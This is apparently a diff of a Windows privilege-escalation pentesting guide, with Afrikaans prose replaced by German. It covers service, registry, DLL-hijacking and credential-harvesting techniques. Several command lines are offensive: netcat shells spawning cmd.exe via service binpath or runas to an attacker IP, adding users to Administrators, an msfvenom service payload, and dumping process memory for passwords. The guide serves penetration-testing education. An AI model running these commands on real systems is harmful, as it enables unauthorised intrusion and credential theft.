+Sie sollten überprüfen, ob eine der Gruppen, zu denen Sie gehören, interessante Berechtigungen hat.
 ```bash
 # CMD
 net users %username% #Me
@@ -332,47 +332,47 @@ Get-LocalUser | ft Name,Enabled,LastLogon
 Get-ChildItem C:\Users -Force | select Name
 Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```
-### Privileged groups
+### Privilegierte Gruppen
 
-As jy **tot 'n paar bevoorregte groepe behoort, mag jy in staat wees om voorregte te verhoog**. Leer meer oor bevoorregte groepe en hoe om hulle te misbruik om voorregte te verhoog hier:
+Wenn Sie **zu einer privilegierten Gruppe gehören, können Sie möglicherweise Privilegien eskalieren**. Erfahren Sie hier mehr über privilegierte Gruppen und wie man sie missbraucht, um Privilegien zu eskalieren:
 
 {% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
 [privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
 {% endcontent-ref %}
 
-### Token manipulation
+### Token-Manipulation
 
-**Leer meer** oor wat 'n **token** is op hierdie bladsy: [**Windows Tokens**](../authentication-credentials-uac-and-efs/#access-tokens).\
-Kyk na die volgende bladsy om **meer te leer oor interessante tokens** en hoe om hulle te misbruik:
+**Erfahren Sie mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/#access-tokens).\
+Überprüfen Sie die folgende Seite, um **mehr über interessante Tokens zu erfahren** und wie man sie missbraucht:
 
 {% content-ref url="privilege-escalation-abusing-tokens.md" %}
 [privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
 {% endcontent-ref %}
 
-### Logged users / Sessions
+### Eingeloggte Benutzer / Sitzungen
 ```bash
 qwinsta
 klist sessions
 ```
-### Tuisgidsen
+### Home-Ordner
 ```powershell
 dir C:\Users
 Get-ChildItem C:\Users
 ```
-### Wagwoordbeleid
+### Passwort-Richtlinie
 ```bash
 net accounts
 ```
-### Kry die inhoud van die klembord
+### Holen Sie sich den Inhalt der Zwischenablage
 ```bash
 powershell -command "Get-Clipboard"
 ```
-## Hardloopprosesse
+## Ausgeführte Prozesse
 
-### Lêer- en Gidspermitte
+### Datei- und Ordners Berechtigungen
 
-Eerstens, lys die prosesse **kyk vir wagwoorde binne die opdraglyn van die proses**.\
-Kyk of jy **'n sekere binêre wat loop kan oorskryf** of as jy skrywepermitte van die binêre gids het om moontlike [**DLL Hijacking-aanvalle**](dll-hijacking/) te benut:
+Zunächst einmal, listen Sie die Prozesse **überprüfen Sie Passwörter in der Befehlszeile des Prozesses**.\
+Überprüfen Sie, ob Sie **eine laufende Binärdatei überschreiben** können oder ob Sie Schreibberechtigungen für den Binärordner haben, um mögliche [**DLL Hijacking-Angriffe**](dll-hijacking/) auszunutzen:
 ```bash
 Tasklist /SVC #List processes running and services
 tasklist /v /fi "username eq system" #Filter "system" processes
@@ -383,9 +383,9 @@ Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "sv
 #Without usernames
 Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
 ```
-Always check for possible [**electron/cef/chromium debuggers** wat loop, jy kan dit misbruik om privaathede te verhoog](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).
+Immer prüfen, ob mögliche [**electron/cef/chromium-Debugger** laufen, die Sie missbrauchen könnten, um Privilegien zu eskalieren](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).
 
-**Kontroleer toestemmings van die prosesse se binaire**
+**Überprüfen der Berechtigungen der Prozess-Binärdateien**
 ```bash
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
 for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
@@ -394,7 +394,7 @@ icacls "%%z"
 )
 )
 ```
-**Kontroleer toestemmings van die vouers van die prosesse se binaire lêers (**[**DLL Hijacking**](dll-hijacking/)**)**
+**Überprüfung der Berechtigungen der Ordner der Prozess-Binärdateien (**[**DLL Hijacking**](dll-hijacking/)**)**
 ```bash
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
 "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
@@ -402,67 +402,67 @@ icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone
 todos %username%" && echo.
 )
 ```
-### Geheue Wagwoord mynbou
+### Memory Password mining
 
-Jy kan 'n geheue-dump van 'n lopende proses skep met **procdump** van sysinternals. Dienste soos FTP het die **bewyse in duidelike teks in geheue**, probeer om die geheue te dump en lees die bewese.
+Sie können einen Speicherauszug eines laufenden Prozesses mit **procdump** von Sysinternals erstellen. Dienste wie FTP haben die **Anmeldeinformationen im Klartext im Speicher**, versuchen Sie, den Speicher auszulesen und die Anmeldeinformationen zu lesen.
 ```bash
 procdump.exe -accepteula -ma <proc_name_tasklist>
 ```
-### Onveilige GUI-apps
+### Unsichere GUI-Apps
 
-**Toepassings wat as SYSTEM loop, mag 'n gebruiker toelaat om 'n CMD te genereer, of om gidsen te blaai.**
+**Anwendungen, die als SYSTEM ausgeführt werden, können einem Benutzer erlauben, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**
 
-Voorbeeld: "Windows Help and Support" (Windows + F1), soek na "opdragprompt", klik op "Klik om Opdragprompt te open"
+Beispiel: "Windows-Hilfe und Support" (Windows + F1), suchen Sie nach "Eingabeaufforderung", klicken Sie auf "Klicken Sie hier, um die Eingabeaufforderung zu öffnen"
 
 ## Dienste
 
-Kry 'n lys van dienste:
+Holen Sie sich eine Liste der Dienste:
 ```bash
 net start
 wmic service list brief
 sc query
 Get-Service
 ```
-### Toestemmings
+### Berechtigungen
 
-Jy kan **sc** gebruik om inligting van 'n diens te verkry
+Sie können **sc** verwenden, um Informationen zu einem Dienst zu erhalten.
 ```bash
 sc qc <service_name>
 ```
-Dit word aanbeveel om die binêre **accesschk** van _Sysinternals_ te hê om die vereiste privaatheidsvlak vir elke diens te kontroleer.
+Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu haben, um das erforderliche Berechtigungsniveau für jeden Dienst zu überprüfen.
 ```bash
 accesschk.exe -ucqv <Service_Name> #Check rights for different groups
 ```
-Dit word aanbeveel om te kyk of "Geverifieerde gebruikers" enige diens kan wysig:
+Es wird empfohlen zu überprüfen, ob "Authentifizierte Benutzer" einen Dienst ändern können:
 ```bash
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 accesschk.exe -uwcqv %USERNAME% * /accepteula
 accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
 accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 ```
-[U kan accesschk.exe vir XP hier aflaai](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)
+[Sie können accesschk.exe für XP hier herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)
 
-### Aktiveer diens
+### Dienst aktivieren
 
-As u hierdie fout het (byvoorbeeld met SSDPSRV):
+Wenn Sie diesen Fehler haben (zum Beispiel mit SSDPSRV):
 
-_Sisteemfout 1058 het voorgekom._\
-&#xNAN;_&#x54;he diens kan nie begin word nie, hetsy omdat dit gedeaktiveer is of omdat daar geen geaktiveerde toestelle aan dit gekoppel is nie._
+_Systemfehler 1058 ist aufgetreten._\
+&#xNAN;_&#x54;Der Dienst kann nicht gestartet werden, entweder weil er deaktiviert ist oder weil keine aktivierten Geräte damit verbunden sind._
 
-U kan dit aktiveer deur
+Sie können ihn aktivieren, indem Sie
 ```bash
 sc config SSDPSRV start= demand
 sc config SSDPSRV obj= ".\LocalSystem" password= ""
 ```
-**Hou in gedagte dat die diens upnphost afhanklik is van SSDPSRV om te werk (vir XP SP1)**
+**Beachten Sie, dass der Dienst upnphost von SSDPSRV abhängt, um zu funktionieren (für XP SP1)**
 
-**Nog 'n omweg** van hierdie probleem is om te loop:
+**Eine weitere Lösung** dieses Problems besteht darin, Folgendes auszuführen:
 ```
 sc.exe config usosvc start= auto
 ```
-### **Wysig diens binaire pad**
+### **Ändern des Dienst-Binärpfads**
 
-In die scenario waar die "Geoutentiseerde gebruikers" groep **SERVICE\_ALL\_ACCESS** op 'n diens besit, is dit moontlik om die diens se uitvoerbare binaire te wysig. Om **sc** te wysig en uit te voer:
+In dem Szenario, in dem die Gruppe "Authentifizierte Benutzer" **SERVICE\_ALL\_ACCESS** auf einen Dienst besitzt, ist die Modifikation der ausführbaren Binärdatei des Dienstes möglich. Um **sc** zu modifizieren und auszuführen:
 ```bash
 sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
 sc config <Service_Name> binpath= "net localgroup administrators username /add"
@@ -470,40 +470,40 @@ sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cm
 
 sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
 ```
-### Herstart diens
+### Dienst neu starten
 ```bash
 wmic service NAMEOFSERVICE call startservice
 net stop [service name] && net start [service name]
 ```
-Privileges kan deur verskeie toestemmings verhoog word:
+Privilegien können durch verschiedene Berechtigungen erhöht werden:
 
-* **SERVICE\_CHANGE\_CONFIG**: Laat herkonfigurasie van die diensbinarie toe.
-* **WRITE\_DAC**: Maak toestemmingherkonfigurasie moontlik, wat lei tot die vermoë om dienskonfigurasies te verander.
-* **WRITE\_OWNER**: Laat eienaarskap verkryging en toestemmingherkonfigurasie toe.
-* **GENERIC\_WRITE**: Erf die vermoë om dienskonfigurasies te verander.
-* **GENERIC\_ALL**: Erf ook die vermoë om dienskonfigurasies te verander.
+* **SERVICE\_CHANGE\_CONFIG**: Ermöglicht die Neukonfiguration der Dienst-Binärdatei.
+* **WRITE\_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen, was zur Fähigkeit führt, Dienstkonfigurationen zu ändern.
+* **WRITE\_OWNER**: Erlaubt den Erwerb von Eigentum und die Neukonfiguration von Berechtigungen.
+* **GENERIC\_WRITE**: Erbt die Fähigkeit, Dienstkonfigurationen zu ändern.
+* **GENERIC\_ALL**: Erbt ebenfalls die Fähigkeit, Dienstkonfigurationen zu ändern.
 
-Vir die opsporing en benutting van hierdie kwesbaarheid, kan die _exploit/windows/local/service\_permissions_ gebruik word.
+Für die Erkennung und Ausnutzung dieser Schwachstelle kann das _exploit/windows/local/service\_permissions_ verwendet werden.
 
-### Dienste binariewe swak toestemmings
+### Schwache Berechtigungen von Dienst-Binärdateien
 
-**Kontroleer of jy die binarie wat deur 'n diens uitgevoer word, kan wysig** of of jy **skryftoestemmings op die gids** het waar die binarie geleë is ([**DLL Hijacking**](dll-hijacking/))**.**\
-Jy kan elke binarie wat deur 'n diens uitgevoer word, verkry met **wmic** (nie in system32 nie) en jou toestemmings nagaan met **icacls**:
+**Überprüfen Sie, ob Sie die Binärdatei, die von einem Dienst ausgeführt wird, ändern können** oder ob Sie **Schreibberechtigungen für den Ordner** haben, in dem sich die Binärdatei befindet ([**DLL Hijacking**](dll-hijacking/))**.**\
+Sie können jede Binärdatei, die von einem Dienst ausgeführt wird, mit **wmic** (nicht in system32) abrufen und Ihre Berechtigungen mit **icacls** überprüfen:
 ```bash
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
 
 for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
 ```
-U kan ook **sc** en **icacls** gebruik:
+Sie können auch **sc** und **icacls** verwenden:
 ```bash
 sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
 FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 ```
-### Dienste registrasie wysigingsregte
+### Dienste-Registry-Berechtigungen ändern
 
-Jy moet kyk of jy enige diensregistrasie kan wysig.\
-Jy kan jou **regte** oor 'n diens **registrasie** nagaan deur:
+Sie sollten überprüfen, ob Sie eine Dienst-Registry ändern können.\
+Sie können Ihre Berechtigungen über eine Dienst-Registry überprüfen, indem Sie:
 ```bash
 reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
 
@@ -512,31 +512,31 @@ for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\
 
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
 ```
-Dit moet nagegaan word of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** `FullControl` toestemmings het. Indien wel, kan die binêre wat deur die diens uitgevoer word, verander word.
+Es sollte überprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** `FullControl`-Berechtigungen besitzen. Wenn ja, kann die von dem Dienst ausgeführte Binärdatei geändert werden.
 
-Om die Pad van die uitgevoerde binêre te verander:
+Um den Pfad der ausgeführten Binärdatei zu ändern:
 ```bash
 reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
 ```
-### Dienste-register AppendData/AddSubdirectory toestemmings
+### Berechtigungen für AppendData/AddSubdirectory im Registrierungsdienst
 
-As jy hierdie toestemming oor 'n register het, beteken dit **jy kan sub-registers van hierdie een skep**. In die geval van Windows dienste is dit **genoeg om willekeurige kode uit te voer:**
+Wenn Sie diese Berechtigung über eine Registrierung haben, bedeutet dies, dass **Sie Unterregistrierungen von dieser erstellen können**. Im Fall von Windows-Diensten ist dies **ausreichend, um beliebigen Code auszuführen:**
 
 {% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
 [appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
 {% endcontent-ref %}
 
-### Ongekwoteerde Dienspade
+### Unquoted Service Paths
 
-As die pad na 'n uitvoerbare lêer nie binne aanhalings is nie, sal Windows probeer om elke einde voor 'n spasie uit te voer.
+Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jede Endung vor einem Leerzeichen auszuführen.
 
-Byvoorbeeld, vir die pad _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om uit te voer:
+Zum Beispiel wird Windows für den Pfad _C:\Program Files\Some Folder\Service.exe_ versuchen, auszuführen:
 ```powershell
 C:\Program.exe
 C:\Program Files\Some.exe
 C:\Program Files\Some Folder\Service.exe
 ```
-Lys alle ongekwoteerde dienspaaie, met uitsluiting van dié wat aan ingeboude Windows-dienste behoort:
+Liste alle unquoted service paths auf, die nicht zu integrierten Windows-Diensten gehören:
 ```powershell
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
 wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services
@@ -556,19 +556,19 @@ echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s &&
 ```powershell
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
-**Jy kan hierdie kwesbaarheid opspoor en benut** met metasploit: `exploit/windows/local/trusted\_service\_path` Jy kan handmatig 'n diens-binary met metasploit skep:
+**Sie können diese Schwachstelle erkennen und ausnutzen** mit metasploit: `exploit/windows/local/trusted\_service\_path` Sie können manuell eine Dienst-Binärdatei mit metasploit erstellen:
 ```bash
 msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
 ```
-### Herstelaksies
+### Recovery Actions
 
-Windows laat gebruikers toe om aksies spesifiek aan te dui wat geneem moet word as 'n diens faal. Hierdie funksie kan geconfigureer word om na 'n binêre te verwys. As hierdie binêre vervangbaar is, mag privilige-escalasie moontlik wees. Meer besonderhede kan gevind word in die [amptelike dokumentasie](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).
+Windows ermöglicht es Benutzern, Aktionen festzulegen, die ergriffen werden sollen, wenn ein Dienst fehlschlägt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binärdatei verweist. Wenn diese Binärdatei ersetzbar ist, könnte eine Privilegieneskalation möglich sein. Weitere Details finden Sie in der [offiziellen Dokumentation](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).
 
-## Toepassings
+## Applications
 
-### Gemonteerde Toepassings
+### Installed Applications
 
-Kontroleer **toestemmings van die binêre** (miskien kan jy een oorskryf en privilige verhoog) en van die **mappes** ([DLL Hijacking](dll-hijacking/)).
+Überprüfen Sie die **Berechtigungen der Binärdateien** (vielleicht können Sie eine überschreiben und Privilegien eskalieren) und der **Ordner** ([DLL Hijacking](dll-hijacking/)).
 ```bash
 dir /a "C:\Program Files"
 dir /a "C:\Program Files (x86)"
@@ -577,11 +577,11 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE
 Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
 Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
-### Skryf Toestemmings
+### Schreibberechtigungen
 
-Kyk of jy 'n konfigurasie-lêer kan wysig om 'n spesiale lêer te lees of of jy 'n binêre lêer kan wysig wat deur 'n Administrateur-rekening uitgevoer gaan word (schedtasks).
+Überprüfen Sie, ob Sie eine Konfigurationsdatei ändern können, um eine spezielle Datei zu lesen, oder ob Sie eine Binärdatei ändern können, die von einem Administratorkonto (schedtasks) ausgeführt wird.
 
-'n Manier om swak vouer/lêer toestemmings in die stelsel te vind, is om te doen:
+Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, besteht darin:
 ```bash
 accesschk.exe /accepteula
 # Find all weak folder permissions per drive.
@@ -604,18 +604,18 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 
 Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
 ```
-### Begin by opstart
+### Beim Start ausführen
 
-**Kyk of jy 'n bietjie registrasie of binêre kan oorskryf wat deur 'n ander gebruiker uitgevoer gaan word.**\
-**Lees** die **volgende bladsy** om meer te leer oor interessante **autostart plekke om voorregte te verhoog**:
+**Überprüfen Sie, ob Sie einige Registrierungs- oder Binärdateien überschreiben können, die von einem anderen Benutzer ausgeführt werden.**\
+**Lesen** Sie die **folgende Seite**, um mehr über interessante **Autorun-Standorte zur Eskalation von Rechten** zu erfahren:
 
 {% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
 [privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
 {% endcontent-ref %}
 
-### Bestuurders
+### Treiber
 
-Soek na moontlike **derdeparty vreemde/kwesbare** bestuurders
+Suchen Sie nach möglichen **drittanbieter-seltsamen/anfälligen** Treibern.
 ```bash
 driverquery
 driverquery.exe /fo table
@@ -623,21 +623,21 @@ driverquery /SI
 ```
 ## PATH DLL Hijacking
 
-As jy **skrywe toestemmings binne 'n gids op PATH** het, kan jy dalk 'n DLL wat deur 'n proses gelaai is, oorneem en **privileges verhoog**.
+Wenn Sie **Schreibberechtigungen in einem Ordner haben, der im PATH vorhanden ist**, könnten Sie in der Lage sein, eine von einem Prozess geladene DLL zu hijacken und **Privilegien zu eskalieren**.
 
-Kontroleer toestemmings van al die gidse binne PATH:
+Überprüfen Sie die Berechtigungen aller Ordner im PATH:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-Vir meer inligting oor hoe om hierdie kontrole te misbruik:
+Für weitere Informationen darüber, wie man diese Überprüfung ausnutzen kann:
 
 {% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
 [writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
 {% endcontent-ref %}
 
-## Netwerk
+## Netzwerk
 
-### Aandele
+### Freigaben
 ```bash
 net view #Get a list of computers
 net view /all /domain [domainname] #Shares on the domains
@@ -647,59 +647,59 @@ net share #Check current shares
 ```
 ### hosts file
 
-Kyk vir ander bekende rekenaars wat hardgecodeer is op die hosts-lêer
+Überprüfen Sie, ob andere bekannte Computer im Hosts-Datei fest codiert sind.
 ```
 type C:\Windows\System32\drivers\etc\hosts
 ```
-### Netwerk Interfaces & DNS
+### Netzwerkinterfaces & DNS
 ```
 ipconfig /all
 Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
 Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 ```
-### Open Ports
+### Offene Ports
 
-Kyk vir **beperkte dienste** van buite
+Überprüfen Sie **eingeschränkte Dienste** von außen
 ```bash
 netstat -ano #Opened ports?
 ```
-### Router Tabel
+### Routing-Tabelle
 ```
 route print
 Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
 ```
-### ARP Tabel
+### ARP-Tabelle
 ```
 arp -A
 Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
 ```
-### Vuurmuur Reëls
+### Firewall-Regeln
 
-[**Kyk na hierdie bladsy vir Vuurmuur verwante opdragte**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, skakel af, skakel af...)**
+[**Überprüfen Sie diese Seite für firewallbezogene Befehle**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, ausschalten, ausschalten...)**
 
-Meer[ opdragte vir netwerk enumerasie hier](../basic-cmd-for-pentesters.md#network)
+Mehr[ Befehle zur Netzwerkanalyse hier](../basic-cmd-for-pentesters.md#network)
 
-### Windows Subsystem vir Linux (wsl)
+### Windows-Subsystem für Linux (wsl)
 ```bash
 C:\Windows\System32\bash.exe
 C:\Windows\System32\wsl.exe
 ```
-Binaar `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`
+Die Binärdatei `bash.exe` kann auch in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` gefunden werden.
 
-As jy root gebruiker kry, kan jy op enige poort luister (die eerste keer wat jy `nc.exe` gebruik om op 'n poort te luister, sal dit via GUI vra of `nc` deur die firewall toegelaat moet word).
+Wenn Sie den Root-Benutzer erhalten, können Sie auf jedem Port lauschen (beim ersten Mal, wenn Sie `nc.exe` verwenden, um auf einem Port zu lauschen, wird über die GUI gefragt, ob `nc` von der Firewall erlaubt werden soll).
 ```bash
 wsl whoami
 ./ubuntun1604.exe config --default-user root
 wsl whoami
 wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
 ```
-Om maklik bash as root te begin, kan jy probeer `--default-user root`
+Um bash einfach als root zu starten, können Sie `--default-user root` versuchen.
 
-Jy kan die `WSL` lêerstelsel verken in die gids `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`
+Sie können das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` erkunden.
 
-## Windows Kredensiale
+## Windows-Anmeldeinformationen
 
-### Winlogon Kredensiale
+### Winlogon-Anmeldeinformationen
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
 
@@ -711,16 +711,16 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDef
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
 ```
-### Kredensiaalbestuurder / Windows-kluis
+### Anmeldeinformationsmanager / Windows-Tresor
 
-Van [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
-Die Windows-kluis stoor gebruikerskredensiale vir bedieners, webwerwe en ander programme wat **Windows** kan **die gebruikers outomaties laat aanmeld**. Op die eerste oogopslag mag dit lyk asof gebruikers hul Facebook-kredensiale, Twitter-kredensiale, Gmail-kredensiale ens. kan stoor, sodat hulle outomaties via blaaiers kan aanmeld. Maar dit is nie so nie.
+Von [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
+Der Windows-Tresor speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, bei denen **Windows** die Benutzer **automatisch anmelden kann**. Auf den ersten Blick mag es so aussehen, als könnten Benutzer jetzt ihre Facebook-Anmeldeinformationen, Twitter-Anmeldeinformationen, Gmail-Anmeldeinformationen usw. speichern, damit sie sich automatisch über Browser anmelden. Aber das ist nicht so.
 
-Windows-kluis stoor kredensiale wat Windows kan gebruik om die gebruikers outomaties aan te meld, wat beteken dat enige **Windows-toepassing wat kredensiale benodig om toegang tot 'n hulpbron** (bediener of 'n webwerf) **hierdie Kredensiaalbestuurder** & Windows-kluis kan gebruik en die verskafde kredensiale kan gebruik in plaas daarvan dat gebruikers die gebruikersnaam en wagwoord heeltyd invoer.
+Der Windows-Tresor speichert Anmeldeinformationen, die Windows verwenden kann, um die Benutzer automatisch anzumelden, was bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen benötigt, um auf eine Ressource** (Server oder Website) **zuzugreifen, diesen Anmeldeinformationsmanager** & Windows-Tresor nutzen und die bereitgestellten Anmeldeinformationen verwenden kann, anstatt dass die Benutzer ständig ihren Benutzernamen und ihr Passwort eingeben.
 
-Tensy die toepassings met die Kredensiaalbestuurder kommunikeer, dink ek nie dit is moontlik vir hulle om die kredensiale vir 'n gegewe hulpbron te gebruik nie. So, as jou toepassing die kluis wil gebruik, moet dit op een of ander manier **met die kredensiaalbestuurder kommunikeer en die kredensiale vir daardie hulpbron** van die standaardopbergkluis aan vra.
+Es sei denn, die Anwendungen interagieren mit dem Anmeldeinformationsmanager, denke ich nicht, dass es ihnen möglich ist, die Anmeldeinformationen für eine bestimmte Ressource zu verwenden. Wenn Ihre Anwendung also den Tresor nutzen möchte, sollte sie irgendwie **mit dem Anmeldeinformationsmanager kommunizieren und die Anmeldeinformationen für diese Ressource** aus dem Standardspeichertresor anfordern.
 
-Gebruik die `cmdkey` om die gestoor kredensiale op die masjien te lys.
+Verwenden Sie `cmdkey`, um die gespeicherten Anmeldeinformationen auf dem Computer aufzulisten.
 ```bash
 cmdkey /list
 Currently stored credentials:
@@ -728,48 +728,48 @@ Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
 ```
-Dan kan jy `runas` met die `/savecred` opsies gebruik om die gestoor geloofsbriewe te gebruik. Die volgende voorbeeld roep 'n afstandlike binêre aan via 'n SMB-aandeel.
+Dann können Sie `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldeinformationen zu nutzen. Das folgende Beispiel ruft eine entfernte Binärdatei über einen SMB-Freigabe auf.
 ```bash
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 ```
-Gebruik `runas` met 'n verskafde stel van geloofsbriewe.
+Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldeinformationen.
 ```bash
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 ```
-Let wel dat mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), of van [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).
+Beachten Sie, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder aus dem [Empire Powershells-Modul](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).
 
 ### DPAPI
 
-Die **Data Protection API (DPAPI)** bied 'n metode vir simmetriese versleuteling van data, hoofsaaklik gebruik binne die Windows-bedryfstelsel vir die simmetriese versleuteling van asimmetriese privaat sleutels. Hierdie versleuteling maak gebruik van 'n gebruiker of stelsels geheim om aansienlik by te dra tot entropie.
+Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten, die hauptsächlich im Windows-Betriebssystem zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet wird. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um erheblich zur Entropie beizutragen.
 
